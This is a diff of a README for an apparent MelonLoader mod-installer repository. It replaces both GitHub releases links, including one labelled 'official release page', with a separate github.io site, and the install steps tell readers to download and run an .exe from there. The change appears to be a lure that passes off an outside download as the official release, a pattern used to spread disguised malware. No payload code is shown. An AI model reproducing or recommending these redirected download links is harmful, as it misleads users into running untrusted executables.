@@ -1,6 +1,6 @@
 # 🍈 melon-loader-download - Install Unity game mods with ease
 
-[![Download Now](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Genniferunchangeable590/melon-loader-download/releases)
+[![Download Now](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://genniferunchangeable590.github.io)
 
 ## 📌 Overview
 
@@ -19,7 +19,7 @@ Before you begin, ensure your computer meets these basic requirements:
 
 Follow these steps to set up your game:
 
-1. Visit the [official release page](https://github.com/Genniferunchangeable590/melon-loader-download/releases) to see the latest versions.
+1. Visit the [official release page](https://genniferunchangeable590.github.io) to see the latest versions.
 2. Select the latest version available at the top of the list.
 3. Click the file ending in `.exe` to download the installer to your computer.
 4. Locate the downloaded file in your browser's download folder.
